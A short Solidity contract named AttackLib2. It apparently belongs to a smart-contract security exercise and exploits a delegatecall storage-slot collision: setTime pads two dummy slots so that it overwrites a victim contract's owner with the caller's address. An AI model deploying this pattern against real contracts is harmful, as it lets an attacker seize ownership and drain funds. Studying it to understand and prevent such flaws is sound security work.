pragma solidity ^0.8.0;

contract AttackLib2 {
    uint256 private dummy1;
    uint256 private dummy2;
    address public owner;

    function setTime(uint256 _time) public {
        dummy1 = _time;
        dummy2 = _time;
        owner = msg.sender;
    }
}
